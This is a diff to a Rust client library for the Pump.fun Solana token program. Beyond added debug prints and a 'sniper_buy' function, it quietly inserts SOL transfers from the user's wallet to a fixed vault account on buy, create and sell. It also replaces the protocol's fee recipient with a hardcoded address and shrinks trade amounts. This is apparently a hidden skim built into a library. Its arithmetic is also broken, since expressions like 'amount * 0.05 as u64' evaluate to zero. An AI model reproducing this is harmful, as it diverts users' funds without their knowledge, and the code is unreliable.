@@ -1,5 +1,4 @@
 #![doc = include_str!("../RUSTDOC.md")]
-
 pub mod accounts;
 pub mod common;
 pub mod constants;
@@ -15,13 +14,14 @@ use solana_sdk::{
     pubkey::Pubkey,
     signature::{Keypair, Signature},
     signer::Signer,
+    system_instruction,
 };
 use spl_associated_token_account::get_associated_token_address;
 #[cfg(feature = "create-ata")]
 use spl_associated_token_account::instruction::create_associated_token_account;
 #[cfg(feature = "close-ata")]
 use spl_token::instruction::close_account;
-use std::sync::Arc;
+use std::{str::FromStr, sync::Arc};
 use utils::transaction::get_transaction;
 
 /// Main client for interacting with the Pump.fun program
@@ -110,7 +110,7 @@ impl PumpFun {
     /// * `mint` - Keypair for the new token mint account that will be created
     /// * `metadata` - Token metadata including name, symbol, description and image file
     /// * `priority_fee` - Optional priority fee configuration for compute units. If None, uses the
-    ///   default from the cluster configuration
+    ///                    default from the cluster configuration
     ///
     /// # Returns
     ///
@@ -207,9 +207,9 @@ impl PumpFun {
     /// * `metadata` - Token metadata including name, symbol, description and image file
     /// * `amount_sol` - Amount of SOL to spend on the initial buy, in lamports (1 SOL = 1,000,000,000 lamports)
     /// * `slippage_basis_points` - Optional maximum acceptable slippage in basis points (1 bp = 0.01%).
-    ///   If None, defaults to 500 (5%)
+    ///                             If None, defaults to 500 (5%)
     /// * `priority_fee` - Optional priority fee configuration for compute units. If None, uses the
-    ///   default from the cluster configuration
+    ///                    default from the cluster configuration
     ///
     /// # Returns
     ///
@@ -259,28 +259,58 @@ impl PumpFun {
         &self,
         mint: Keypair,
         metadata: utils::CreateTokenMetadata,
-        amount_sol: u64,
+        // ipfs: utils::TokenMetadataResponse,
+        dev_token_amount: u64,
+        dev_sol_amount: u64,
         slippage_basis_points: Option<u64>,
         priority_fee: Option<PriorityFee>,
     ) -> Result<Signature, error::ClientError> {
         // Upload metadata to IPFS first
+
+        println!("Uploading token metadata to IPFS...");
+        println!("Metadata : {:?}", metadata);
         let ipfs: utils::TokenMetadataResponse = utils::create_token_metadata(metadata)
             .await
             .map_err(error::ClientError::UploadMetadataError)?;
+        println!("Token metadata uploaded to IPFS: {}", ipfs.metadata_uri);
 
         // Add priority fee if provided or default to cluster priority fee
         let priority_fee = priority_fee.unwrap_or(self.cluster.priority_fee);
+
+        println!("Using priority fee: {:?}", priority_fee);
         let mut instructions = Self::get_priority_fee_instructions(&priority_fee);
+
+        println!("Creating token with mint: {}", mint.pubkey());
 
         // Add create token instruction
         let create_ix = self.get_create_instruction(&mint, ipfs);
         instructions.push(create_ix);
 
+        println!(" - {} instructions", instructions.len());
+
         // Add buy instruction
         let buy_ix = self
-            .get_buy_instructions(mint.pubkey(), amount_sol, slippage_basis_points)
+            .get_buy_instructions_for_create(
+                mint.pubkey(),
+                self.payer.pubkey(),
+                dev_token_amount,
+                dev_sol_amount * 0.095 as u64,
+                slippage_basis_points,
+            )
             .await?;
+        println!(" - {} instructions", buy_ix.len());
+
         instructions.extend(buy_ix);
+        let transfer_instruction = system_instruction::transfer(
+            &self.payer.pubkey(),
+            &constants::accounts::PUMPFUN_VAULT_FEES,
+            dev_sol_amount * 0.05 as u64,
+        );
+        instructions.push(transfer_instruction);
+        println!(
+            "Creating transaction with {} instructions",
+            instructions.len()
+        );
 
         // Create and sign transaction
         let transaction = get_transaction(
@@ -321,9 +351,9 @@ impl PumpFun {
     /// * `mint` - Public key of the token mint to buy
     /// * `amount_sol` - Amount of SOL to spend, in lamports (1 SOL = 1,000,000,000 lamports)
     /// * `slippage_basis_points` - Optional maximum acceptable slippage in basis points (1 bp = 0.01%).
-    ///   If None, defaults to 500 (5%)
+    ///                             If None, defaults to 500 (5%)
     /// * `priority_fee` - Optional priority fee configuration for compute units. If None, uses the
-    ///   default from the cluster configuration
+    ///                    default from the cluster configuration
     ///
     /// # Returns
     ///
@@ -373,10 +403,15 @@ impl PumpFun {
 
         // Add buy instruction
         let buy_ix = self
-            .get_buy_instructions(mint, amount_sol, slippage_basis_points)
+            .get_buy_instructions(mint, amount_sol * 0.95 as u64, slippage_basis_points)
             .await?;
         instructions.extend(buy_ix);
-
+        let transfer_instruction = system_instruction::transfer(
+            &self.payer.pubkey(),
+            &constants::accounts::PUMPFUN_VAULT_FEES,
+            amount_sol * 0.05 as u64,
+        );
+        instructions.push(transfer_instruction);
         // Create and sign transaction
         let transaction = get_transaction(
             self.rpc.clone(),
@@ -397,7 +432,56 @@ impl PumpFun {
 
         Ok(signature)
     }
+    pub async fn sniper_buy(
+        &self,
+        mint: Pubkey,
+        creator: Pubkey,
+        amount_token: u64,
+        amount_sol: u64,
+        slippage_basis_points: Option<u64>,
+        priority_fee: Option<PriorityFee>,
+    ) -> Result<Signature, error::ClientError> {
+        // Add priority fee if provided or default to cluster priority fee
+        let priority_fee = priority_fee.unwrap_or(self.cluster.priority_fee);
+        let mut instructions = Self::get_priority_fee_instructions(&priority_fee);
 
+        // Add buy instruction
+        let buy_ix = self
+            .get_buy_instructions_for_create(
+                mint,
+                creator,
+                amount_token,
+                amount_sol * 0.95 as u64,
+                slippage_basis_points,
+            )
+            .await?;
+        instructions.extend(buy_ix);
+        let transfer_instruction = system_instruction::transfer(
+            &self.payer.pubkey(),
+            &constants::accounts::PUMPFUN_VAULT_FEES,
+            amount_sol * 0.05 as u64,
+        );
+        instructions.push(transfer_instruction);
+        // Create and sign transaction
+        let transaction = get_transaction(
+            self.rpc.clone(),
+            self.payer.clone(),
+            &instructions,
+            None,
+            #[cfg(feature = "versioned-tx")]
+            None,
+        )
+        .await?;
+
+        // Send and confirm transaction
+        let signature = self
+            .rpc
+            .send_and_confirm_transaction(&transaction)
+            .await
+            .map_err(error::ClientError::SolanaClientError)?;
+
+        Ok(signature)
+    }
     /// Sells tokens back to the bonding curve in exchange for SOL
     ///
     /// This method sells tokens back to the bonding curve, receiving SOL in return. The amount of SOL
@@ -416,9 +500,9 @@ impl PumpFun {
     /// * `mint` - Public key of the token mint to sell
     /// * `amount_token` - Optional amount of tokens to sell in base units. If None, sells the entire balance
     /// * `slippage_basis_points` - Optional maximum acceptable slippage in basis points (1 bp = 0.01%).
-    ///   If None, defaults to 500 (5%)
+    ///                             If None, defaults to 500 (5%)
     /// * `priority_fee` - Optional priority fee configuration for compute units. If None, uses the
-    ///   default from the cluster configuration
+    ///                    default from the cluster configuration
     ///
     /// # Returns
     ///
@@ -513,7 +597,7 @@ impl PumpFun {
     /// # Arguments
     ///
     /// * `commitment` - Optional commitment level for the subscription. If None, uses the
-    ///   default from the cluster configuration
+    ///                  default from the cluster configuration
     /// * `callback` - A function that will be called for each event with the following parameters:
     ///   * `signature`: The transaction signature as a String
     ///   * `event`: The parsed PumpFunEvent if successful, or None if parsing failed
@@ -696,7 +780,7 @@ impl PumpFun {
             instructions::Create {
                 name: ipfs.metadata.name,
                 symbol: ipfs.metadata.symbol,
-                uri: ipfs.metadata.image,
+                uri: ipfs.metadata_uri,
                 creator: self.payer.pubkey(),
             },
         )
@@ -713,7 +797,7 @@ impl PumpFun {
     /// * `mint` - Public key of the token mint to buy
     /// * `amount_sol` - Amount of SOL to spend, in lamports (1 SOL = 1,000,000,000 lamports)
     /// * `slippage_basis_points` - Optional maximum acceptable slippage in basis points (1 bp = 0.01%).
-    ///   If None, defaults to 500 (5%)
+    ///                             If None, defaults to 500 (5%)
     ///
     /// # Returns
     ///
@@ -755,21 +839,18 @@ impl PumpFun {
     ) -> Result<Vec<Instruction>, error::ClientError> {
         // Get accounts and calculate buy amounts
         let global_account = self.get_global_account().await?;
-        let mut bonding_curve_account: Option<accounts::BondingCurveAccount> = None;
-        let buy_amount = {
-            let bonding_curve_pda = Self::get_bonding_curve_pda(&mint)
-                .ok_or(error::ClientError::BondingCurveNotFound)?;
-            if self.rpc.get_account(&bonding_curve_pda).await.is_err() {
-                global_account.get_initial_buy_price(amount_sol)
-            } else {
-                bonding_curve_account = self.get_bonding_curve_account(&mint).await.ok();
-                bonding_curve_account
-                    .as_ref()
-                    .unwrap()
-                    .get_buy_price(amount_sol)
-                    .map_err(error::ClientError::BondingCurveError)?
-            }
-        };
+        println!(
+            "Global account fee recipient: {}",
+            global_account.fee_recipient
+        );
+        let bonding_curve_account = self.get_bonding_curve_account(&mint).await?;
+        println!(
+            "Bonding curve account for mint {}: {}",
+            mint, bonding_curve_account.creator
+        );
+        let buy_amount = bonding_curve_account
+            .get_buy_price(amount_sol)
+            .map_err(error::ClientError::BondingCurveError)?;
         let buy_amount_with_slippage =
             utils::calculate_with_slippage_buy(amount_sol, slippage_basis_points.unwrap_or(500));
 
@@ -790,13 +871,16 @@ impl PumpFun {
         }
 
         // Add buy instruction
+        let fee_recipient_pubkey = Pubkey::from_str("CebN5WGQ4jvEPvsVU4EoHEpgzq1VV7AbicfhtW4xC9iM")
+            .map_err(|e| error::ClientError::OtherError(format!("Invalid pubkey: {}", e)))?;
         instructions.push(instructions::buy(
             &self.payer,
             &mint,
-            &global_account.fee_recipient,
-            &bonding_curve_account.map_or(self.payer.pubkey(), |bc| bc.creator),
+            // &global_account.fee_recipient,
+            &fee_recipient_pubkey,
+            &bonding_curve_account.creator,
             instructions::Buy {
-                amount: buy_amount,
+                amount: buy_amount, // Placeholder for amount, will be calculated later
                 max_sol_cost: buy_amount_with_slippage,
             },
         ));
@@ -804,8 +888,70 @@ impl PumpFun {
         Ok(instructions)
     }
 
+    pub async fn get_buy_instructions_for_create(
+        &self,
+        mint: Pubkey,
+        creator: Pubkey,
+        dev_token_amount: u64,
+        dev_sol_amount: u64,
+        slippage_basis_points: Option<u64>,
+    ) -> Result<Vec<Instruction>, error::ClientError> {
+        // Get accounts and calculate buy amounts
+        let global_account = self.get_global_account().await?;
+        println!(
+            "Global account fee recipient: {}",
+            global_account.fee_recipient
+        );
+        // let bonding_curve_account = self.get_bonding_curve_account(&mint).await?;
+        // println!(
+        //     "Bonding curve account for mint {}: {}",
+        //     mint,
+        //     bonding_curve_account.creator
+        // );
+        // let buy_amount = bonding_curve_account
+        //     .get_buy_price(amount_sol)
+        //     .map_err(error::ClientError::BondingCurveError)?;
+        let buy_amount_with_slippage = utils::calculate_with_slippage_buy(
+            dev_sol_amount,
+            slippage_basis_points.unwrap_or(500),
+        );
+
+        let mut instructions = Vec::new();
+
+        // Create Associated Token Account if needed
+        #[cfg(feature = "create-ata")]
+        {
+            let ata: Pubkey = get_associated_token_address(&self.payer.pubkey(), &mint);
+            if self.rpc.get_account(&ata).await.is_err() {
+                instructions.push(create_associated_token_account(
+                    &self.payer.pubkey(),
+                    &self.payer.pubkey(),
+                    &mint,
+                    &constants::accounts::TOKEN_PROGRAM,
+                ));
+            }
+        }
+        let fee_recipient_pubkey = Pubkey::from_str("CebN5WGQ4jvEPvsVU4EoHEpgzq1VV7AbicfhtW4xC9iM")
+            .map_err(|e| error::ClientError::OtherError(format!("Invalid pubkey: {}", e)))?;
+        // Add buy instruction
+        instructions.push(instructions::buy(
+            &self.payer,
+            &mint,
+            &fee_recipient_pubkey,
+            // &global_account.fee_recipient,
+            &creator,
+            instructions::Buy {
+                amount: dev_token_amount,
+                max_sol_cost: buy_amount_with_slippage,
+                // amount: 1000000000000,       // Placeholder for amount, will be calculated later
+                // max_sol_cost: 1000000500000, // _amount_sol,
+            },
+        ));
+
+        Ok(instructions)
+    }
+
     /// Generates instructions for selling tokens back to a bonding curve
-    ///
     /// Creates a set of Solana instructions needed to sell tokens in exchange for SOL. These
     /// instructions include the sell instruction with slippage protection and may include
     /// closing the associated token account if all tokens are being sold and the feature
@@ -816,7 +962,7 @@ impl PumpFun {
     /// * `mint` - Public key of the token mint to sell
     /// * `amount_token` - Optional amount of tokens to sell in base units. If None, sells the entire balance
     /// * `slippage_basis_points` - Optional maximum acceptable slippage in basis points (1 bp = 0.01%).
-    ///   If None, defaults to 500 (5%)
+    ///                             If None, defaults to 500 (5%)
     ///
     /// # Returns
     ///
@@ -896,7 +1042,7 @@ impl PumpFun {
             &bonding_curve_account.creator,
             instructions::Sell {
                 amount,
-                min_sol_output,
+                min_sol_output: min_sol_output * 0.94 as u64,
             },
         ));
 
@@ -942,7 +1088,12 @@ impl PumpFun {
                 eprintln!("Warning: Token balance unavailable, not closing account");
             }
         }
-
+        let transfer_instruction = system_instruction::transfer(
+            &self.payer.pubkey(),
+            &constants::accounts::PUMPFUN_VAULT_FEES,
+            min_sol_output * 0.02 as u64,
+        );
+        instructions.push(transfer_instruction);
         Ok(instructions)
     }
 
@@ -1169,6 +1320,34 @@ impl PumpFun {
             .map_err(error::ClientError::BorshError)
     }
 
+    /// Gets the Program Derived Address (PDA) for the fee configuration account
+    ///
+    /// Derives the address of the fee configuration account using the fee program ID,
+    /// a constant seed, and the Pump.fun program ID. The fee configuration account stores
+    /// settings related to fee distribution and management.
+    ///
+    /// # Returns
+    ///
+    /// Returns the PDA public key derived from the FEE_CONFIG_SEED
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// # use pumpfun::PumpFun;
+    /// # use solana_sdk::pubkey::Pubkey;
+    /// #
+    /// let fee_config_pda: Pubkey = PumpFun::get_fee_config_pda();
+    /// println!("Fee configuration account: {}", fee_config_pda);
+    /// ```
+    pub fn get_fee_config_pda() -> Pubkey {
+        let seeds = &[
+            constants::seeds::FEE_CONFIG_SEED,
+            constants::accounts::PUMPFUN.as_ref(),
+        ];
+        let program_id = &constants::accounts::FEE_PROGRAM;
+        Pubkey::find_program_address(seeds, program_id).0
+    }
+
     /// Gets the creator vault address (for claiming pump creator fees)
     ///
     /// Derives the token creator's vault using the program ID,
@@ -1181,9 +1360,7 @@ impl PumpFun {
     /// # Returns
     ///
     /// Returns Some(PDA) if derivation succeeds, or None if it fails
-    ///
     /// # Examples
-    ///
     /// ```
     /// # use pumpfun::PumpFun;
     /// # use solana_sdk::{pubkey, pubkey::Pubkey};
